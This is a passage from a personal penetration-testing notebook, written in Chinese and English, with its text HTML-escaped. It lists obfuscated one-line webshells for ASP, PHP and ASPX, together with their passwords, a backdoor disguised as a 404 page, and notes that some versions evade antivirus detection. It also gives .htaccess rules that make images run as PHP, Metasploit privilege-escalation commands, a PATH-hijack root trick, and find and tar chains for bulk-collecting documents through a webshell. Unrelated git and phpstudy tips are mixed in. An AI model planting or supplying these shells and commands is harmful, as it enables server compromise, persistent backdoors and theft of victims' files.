   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval(eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;shezhang&quot;))%&amp;gt;
    
   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%eval&quot;&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;(&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;v&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;a&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;l&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;r&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;q&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;u&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;e&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;s&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;t&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;(&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;0&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;2&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;-&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;5&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;&quot;)&quot;)%&amp;gt;(å¯†ç æ˜¯-7)

   php:
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $a = base64_decode(Y.X.N.z.Z.X.J01);$a($_POST[g]);?&amp;gt;&lt;/span&gt;       key:g
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $x_x=base64_decode(Y.X.N.z.Z.X.J01);$x_x(($_POST[$_GET[a]]));?&amp;gt;&lt;/span&gt;        key:the value of &quot;a&quot;
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$a=str_replace(x,&quot;&quot;,&quot;axsxxsxexrxxt&quot;);$a($_POST[&quot;shezhang&quot;]);?&amp;gt;&lt;/span&gt;
    
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$lang=(string)key($_POST);$lang($_POST[&#39;shezhang&#39;]);?&amp;gt;&lt;/span&gt;
    
   test&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php$k=&quot;ass&quot;.&quot;ert&quot;;$k(${&quot;_PO&quot;.&quot;ST&quot;}[&#39;nihao&#39;]);?&amp;gt;&lt;/span&gt;
    
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php $a=&quot;a&quot;.&quot;s&quot;.&quot;s&quot;.&quot;e&quot;.&quot;r&quot;.&quot;t&quot;; $a($_POST[&quot;shezhang&quot;]); ?&amp;gt;&lt;/span&gt;
    
   &amp;lt;?php         
   @$_=&quot;s&quot;.&quot;s&quot;./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;e&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/&quot;r&quot;;         
   @$_=/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;a&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/$_./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/&quot;t&quot;;         
   @$_/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/($/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/{&quot;_P&quot;./&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;OS&quot;./*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/&quot;T&quot;}         
   &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;);?&amp;gt;  å¯†ç æ˜¯ -7
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php if(!$_POST[&#39;nihao&#39;]){header(&#39;HTTP/1.1 404 Not Found&#39;); exit(); }else{ $s=&quot;p&quot;.&quot;r&quot;.&quot;e&quot;.&quot;g&quot;.&quot;_&quot;.&quot;r&quot;.&quot;e&quot;.&quot;p&quot;.&quot;l&quot;.&quot;a&quot;.&quot;c&quot;.&quot;e&quot;; @$s(&quot;~[discuz]~e&quot;,$_POST[&#39;nihao&#39;],&quot;Access denied&quot;); } ?&amp;gt;&lt;/span&gt;

   
   &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The requested URL was not found on this server.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
   &amp;lt;?php
   ($b4dboy = $_POST&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&#39;nihao&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;) &amp;amp;&amp;amp; @preg_replace(&#39;/ad/e&#39;,&#39;@&#39;.str_rot13(&#39;riny&#39;).&#39;($b4dboy)&#39;, &#39;add&#39;); 
   header(&#39;HTTP/1.1 404 Not Found&#39;);
   ?&amp;gt;

   &amp;lt;?php
   include &#39;xxoo.jpg&#39;;
   ?&amp;gt;
   xxoo.jpgä¸ºä¸€å¥è¯å›¾ç‰‡æœ¨é©¬,æ­¤phpåé—¨ä¸­åœ¨winä¸‹èœåˆ€è¿æ¥åªèƒ½çœ‹åˆ°æœ¨é©¬æ‰€åœ¨ç›˜ç¬¦æ–‡ä»¶,å…¶ä»–ç›˜ç¬¦ç£ç›˜ä¸‹æ–‡ä»¶é»˜è®¤åœ¨èœåˆ€ä¸­ä¸å¯åŠ è½½,ä¹Ÿçœ‹ä¸åˆ°,ä½†æ˜¯å¯é€šè¿‡è™šæ‹Ÿç»ˆç«¯&quot;dir ç›˜ç¬¦:&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;
   çœ‹åˆ°,å¯¹æ–‡ä»¶ä¹Ÿæœ‰æ“ä½œæƒé™,åœ¨linuxä¸‹å¯çœ‹åˆ°æ‰€æœ‰æ–‡ä»¶,è¯¥ç‰ˆæœ¬ä¸è¢«æŸ¥æ€

   &amp;lt;?php
   $file = fopen(&quot;test.php&quot;,&quot;w&quot;);
   fwrite($file,$_REQUEST&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;);
   fclose($file);
   ?&amp;gt;
   è¯¥ç‰ˆæœ¬ä¸è¢«æŸ¥æ€,ä¸”æ¯”ä¸Šé¢ä¸€ä¸ªæ›´å®‰å…¨&lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;   aspx:
   ASPXä¸€å¥è¯çš„è¿‡å®‰å…¨ç‹—æ•ˆæœä¸æ€ä¹ˆæ ·,ä¸è¿‡æˆ‘è®¤ä¸ºèƒ½æ”¯æŒaspxç™¾åˆ†ä¹‹8/90æ”¯æŒasp
   &lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%@PageLanguage=Jscript%&amp;gt;      
   &amp;lt;%var/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/P/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/=/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;e&quot;+&quot;v&quot;+/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/
   &quot;a&quot;+&quot;l&quot;+&quot;(&quot;+&quot;R&quot;+&quot;e&quot;+/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;q&quot;+&quot;u&quot;+&quot;e&quot;/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/+&quot;s&quot;+&quot;t&quot;+      
   &quot;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&quot;+      
   &quot;,&quot;+&quot;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&quot;+&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;+&quot;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&quot;+&quot;)&quot;;eval      
   (/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/P/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/,/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;ge&quot;&gt;*/&quot;u&quot;+&quot;n&quot;+&quot;s&quot;/*&lt;/span&gt;-/&lt;span class=&quot;ge&quot;&gt;*-*&lt;/span&gt;/+&quot;a&quot;+&quot;f&quot;+&quot;e&quot;/&lt;span class=&quot;ge&quot;&gt;*-/*&lt;/span&gt;-&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;/);%&amp;gt;  å¯†ç  -7
    
    
   &lt;span class=&quot;nv&quot;&gt;&amp;lt;%@PageLanguage=&quot;Jscript&quot;%&amp;gt;&amp;lt;%eval(Request.Item[&quot;shezhang&quot;],&quot;unsafe&quot;);%&amp;gt;&lt;/span&gt;
    
    
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;script&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;C#&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;runat=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;server&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;      
   WebAdmin2Y.x.yaaaaa=newWebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;);      
   &lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;                              å¯†ç æ˜¯webadmin

   aspxéšè—ä¸€å¥è¯æ–°:http://z-cg.com/?mod=pad&lt;span class=&quot;ni&quot;&gt;&amp;amp;act=view&amp;amp;id=10(&amp;lt;%WebServices.ShowRunnerVersion();&lt;/span&gt;%&amp;gt;,&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;%WebServices.InitializeWebServices(&quot;fuck&quot;);%&amp;gt;)
&lt;span class=&quot;p&quot;&gt;31.&lt;/span&gt;windows local privileges:http://www.52wa.net/post-198.html
                            http://le4f.net/post/post/windows-x64-local-privilege-escalation
                            https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=9067#lastpost
                            https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
                            http://www.freebuf.com/articles/web/76892.html
                            https://github.com/foxglovesec/Potato
                            in meterpreter:
                            meterpreter&amp;gt;background
                            msf&amp;gt;use post/multi/recon/local_exploit_suggester 
                            msf&amp;gt;show options
                            msf&amp;gt;exploit
                            or  
                            meterpreter&amp;gt;run post/multi/recon/local_exploit_suggester
&lt;span class=&quot;p&quot;&gt;32.&lt;/span&gt;phpstudy for linux:
  wget -c http://lamp.phpstudy.net/phpstudy.bin?
  chmod +x phpstudy.bin
  # æƒé™è®¾ç½®
  ./phpstudy.bin     #è¿è¡Œå®‰è£…

  æœåŠ¡è¿›ç¨‹ç®¡ç†:phpstudy (start|stop|restart|uninstall)
  ç«™ç‚¹ä¸»æœºç®¡ç†:phpstudy (add|del|list)
  ftpdç”¨æˆ·ç®¡ç†:phpstudy ftp (add|del|list)
&lt;span class=&quot;p&quot;&gt;33.&lt;/span&gt;strem:http://www.yxbao.com/bd/27803.html#goDown
&lt;span class=&quot;p&quot;&gt;34.&lt;/span&gt;linuxçš„gitä½¿ç”¨:
  http://www.linuxidc.com/Linux/2014-02/96989.htm
  å®Œæˆå¯†é’¥çš„è®¾ç½®å:
  git init
  git add .
  git commit -a -m &quot;xxx&quot;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;æ²¡æœ‰è¿™ä¸€æ­¥ä¼šæ˜¾ç¤ºerror&amp;gt;
  git remote add origin url
  git push -u origin master

  æ›´æ–°éƒ¨åˆ†æ–‡ä»¶æ—¶,æäº¤æ›´æ–°:
  git add file(changed file or new file,the command &#39;git add&#39; means add file to local git repositories)
  git status(check is the file status is ok)
  git commit -a -m &quot;something&quot;(without commit command can not update the file,this is a &#39;must&#39;)
  git push -u origin master&lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;  æ–°å»ºæœ¬åœ°gitä»“åº“æ—¶,æ·»åŠ æ–‡ä»¶:(è¦å…ˆpullä¸‹æ¥tar_urlçš„æ–‡ä»¶åˆ°æ–°å»ºçš„æ–‡ä»¶å¤¹,ç„¶åå°†è¦æäº¤çš„æ–‡ä»¶å¤åˆ¶åˆ°æ–°å»ºæ–‡ä»¶å¤¹ä¸­,
  å¦‚æœå…ˆæŠŠè¦æäº¤çš„æ–°æ–‡ä»¶æ”¾åˆ°æ–°å»ºçš„æ–‡ä»¶å¤¹ä¸‹å†è¿›è¡Œå¦‚ä¸‹ä¸€ä¸²å‘½ä»¤,å°†æç¤ºå‡ºé”™)
  git init(åœ¨éšä¾¿æ–°å»ºçš„ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹)
  git pull tar_url(è¯¥æ¡å‘½ä»¤æ‰§è¡Œåç”¨æ–°æ–‡ä»¶æ›¿æ¢æ—§æ–‡ä»¶)
  git status
  git add newfile (git add .)
  git commit -a -m &quot;xxx&quot;
  git remote add origin tar_url
  git push -u origin master                                               
&lt;span class=&quot;p&quot;&gt;
35.&lt;/span&gt;ç”Ÿæ´»å­¦ä¹ :1&amp;gt;(æœ¬æ°æ˜-å¯Œå…°å…‹æ—13æ¡)http://www.201980.com/lizhi/chenggong/9386.html
             2&amp;gt;(æ›¾å›½è—©ä¿®èº«12æ¡)http://www.201980.com/lizhi/chenggong/8007.html
&lt;span class=&quot;p&quot;&gt;36.&lt;/span&gt;mouse without borders:å¤šå±å¹•åŒé”®ç›˜é¼ æ ‡æ§åˆ¶
              https://www.microsoft.com/en-us/download/confirmation.aspx?id=35460(win)
              http://alternativeto.net/software/mouse-without-borders2/?platform=linux(linux)
              x2vnc(ç›®å‰è®¤ä¸ºæœ€å¥½,é€šè¿‡vncè¾¾åˆ°mouse without bordersçš„åŠŸèƒ½!!)
&lt;span class=&quot;p&quot;&gt;37.&lt;/span&gt;javaæ‰§è¡Œjaræ–‡ä»¶å‘½ä»¤:java -jar xx.jar
&lt;span class=&quot;p&quot;&gt;38.&lt;/span&gt;.htaccess can be :
  1&amp;gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;FilesMatch&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;haha&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  SetHandler application/x-httpd-php
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;
  2&amp;gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;Files&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;demo&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;jpg&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  ForceType application/x-httpd-php
  SetHandler application/x-httpd-php
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Files&amp;gt;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;39.&lt;/span&gt;ä¸´æ—¶çš„ä¸€ç§æš´è·¯å¾„æ€è·¯:netsparkeræ‰«å‡ºæœ‰è¾“å…¥çš„phpé¡µé¢åŠè¾“å…¥å˜é‡å,ç„¶åç”¨awvsé‡Œé¢çš„fuzzåŠŸèƒ½fuzz,å¾—åˆ°æš´é”™çš„è·¯å¾„,å¯è¯•.
&lt;span class=&quot;p&quot;&gt;40.&lt;/span&gt;(command1 &amp;amp; command2)==(command1;command2)    
   command1 &amp;amp;&amp;amp; command2ä¸­,å¦‚æœcommand1ä¸æˆåŠŸ,command2åˆ™ä¸ä¼šæ‰§è¡Œ,(command1 &amp;amp; command2)æˆ–(command1;command2)ä¸­å¦‚æœcommand1ä¸æˆåŠŸ,command1ä¼šæ‰§è¡Œ
   locate &lt;span class=&quot;ge&quot;&gt;*.doc &amp;gt; doc.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.docx &amp;gt; docx.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.pdf &amp;gt; pdf.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.txt &amp;gt; txt.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.xls &amp;gt; xls.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.xlsx &amp;gt; xlsx.list &amp;amp;&amp;amp; locate &lt;span class=&quot;ge&quot;&gt;*.jpg &amp;gt; jpg.list &amp;amp;&amp;amp; locate *&lt;/span&gt;.png &amp;gt; png.list
   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;amp;&amp;amp; tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;amp;&amp;amp; tar -T jpg.list -czf jpg.tar.gz &amp;amp;&amp;amp; tar -T png.list -czf png.tar.gz
   
   or when there exist the same ip but different site:

   find -regex &quot;.&lt;span class=&quot;ge&quot;&gt;*\.\(doc\|docx\)&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find -regex &quot;.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.&lt;/span&gt;pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find -regex &quot;.&lt;span class=&quot;ge&quot;&gt;*\.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find -regex &quot;.*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\(&lt;/span&gt;xls&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;xlsx&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find -regex &quot;.&lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\.\(&lt;/span&gt;jpg&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;png&lt;span class=&quot;se&quot;&gt;\)&lt;/span&gt;&quot; &amp;gt; jpg.list    
   ///find . -regex &quot;xxx&quot;   (.)  .  can be used or not while they both mean find the current path
   ///sometimes the system may not support &amp;amp;&amp;amp; to execute &quot;find&quot;,then we should execute above find command without &quot;&amp;amp;&amp;amp;&quot; and find them one by one
   ///or maybe sometimes the system may not support -regex in find command
   ///or maybe sometimes the system may not support without path command with find,use . or ./ better any time find the current path 
   then the better answer:
   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.jpg&quot; &amp;gt; jpg.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.png&quot; &amp;gt; png.list
   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt; &amp;amp;&amp;amp; tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz &amp;amp;&amp;amp; tar -T jpg.list -czf jpg.tar.gz &amp;amp;&amp;amp; tar -T png.list -czf png.tar.gz
   ///however,i found that &quot;&amp;amp;&amp;amp;&quot; or &quot;||&quot; are both not the best,coz command &quot;a &amp;amp;&amp;amp; b&quot; means only command &quot;a&quot; execute successly,then &quot;b&quot; can execute
   ///comman &quot;a || b&quot; means if &quot;a&quot; execute successly,then &quot;b&quot; will not execute
   ///but comman &quot;a;b&quot; means &quot;a&quot; and &quot;b&quot; will both execute,no mater the former &quot;a&quot; execute successfully or not 
   so,the better and beeter combine command is:
   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list;find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list;find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list;find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list;find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.jpg&quot; &amp;gt; jpg.list;find . -name &quot;*&lt;/span&gt;.png&quot; &amp;gt; png.list
   tar -czf code.tar.gz &lt;span class=&quot;err&quot;&gt;*&lt;/span&gt;;tar -T doc.list -czf doc.tar.gz;tar -T docx.list -czf docx.tar.gz;tar -T pdf.list -czf pdf.tar.gz;tar -T txt.list -czf txt.tar.gz;tar -T xls.list -czf xls.tar.gz;tar -T xlsx.list -czf xlsx.tar.gz;tar -T jpg.list -czf jpg.tar.gz;tar -T png.list -czf png.tar.gz

   recently I found command1;command2 performs not good to search all files in webshell&#39;s upon commonds,better to execute comman1 &amp;amp;&amp;amp; command2 if comman1 and command2 cost not few seconds,but a lot seconds to finish executing:

   find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; doc.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; docx.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; pdf.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; txt.list &amp;amp;&amp;amp; find . -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; xls.list &amp;amp;&amp;amp; find . -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; xlsx.list
   tar -T doc.list -czf doc.tar.gz &amp;amp;&amp;amp; tar -T docx.list -czf docx.tar.gz &amp;amp;&amp;amp; tar -T pdf.list -czf pdf.tar.gz &amp;amp;&amp;amp; tar -T txt.list -czf txt.tar.gz &amp;amp;&amp;amp; tar -T xls.list -czf xls.tar.gz &amp;amp;&amp;amp; tar -T xlsx.list -czf xlsx.tar.gz

   or:
   mkdir /tmp/tmp
   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1
   tar -T /tmp/tmp/doc.list -czf /tmp/tmp/doc.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/docx.list -czf /tmp/tmp/docx.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/pdf.list -czf /tmp/tmp/pdf.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/txt.list -czf /tmp/tmp/txt.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xls.list -czf /tmp/tmp/xls.tar.gz &amp;amp;&amp;amp; tar -T /tmp/tmp/xlsx.list -czf /tmp/tmp/xlsx.tar.gz

   sometimes when try to execute in this way:
   PATH=/tmp:$PATH;export PATH;echo $PATH;/bin/echo &#39;&#39;&#39;find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.doc&quot; &amp;gt; /tmp/tmp/doc.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.docx&quot; &amp;gt; /tmp/tmp/docx.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.pdf&quot; &amp;gt; /tmp/tmp/pdf.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.txt&quot; &amp;gt; /tmp/tmp/txt.list &amp;amp;&amp;amp; find / -name &quot;&lt;span class=&quot;ge&quot;&gt;*.xls&quot; &amp;gt; /tmp/tmp/xls.list &amp;amp;&amp;amp; find / -name &quot;*&lt;/span&gt;.xlsx&quot; &amp;gt; /tmp/tmp/xlsx.list&#39;&#39;&#39; &amp;gt; /tmp/.out;rm /tmp/echo;ln -s /tmp/.out /tmp/echo;chmod +x /tmp/.out;/bin/l2ping &amp;gt; /tmp/.out1;cat /tmp/.out1;rm /tmp/.out1

   may found it didn&#39;t succeed to create list file except for doc.list,then try useing normal webshell&#39;s terminal to execute the one without root privilege in one of upon ways&lt;span class=&quot;sb&quot;&gt;


&lt;/span&gt;   windows:
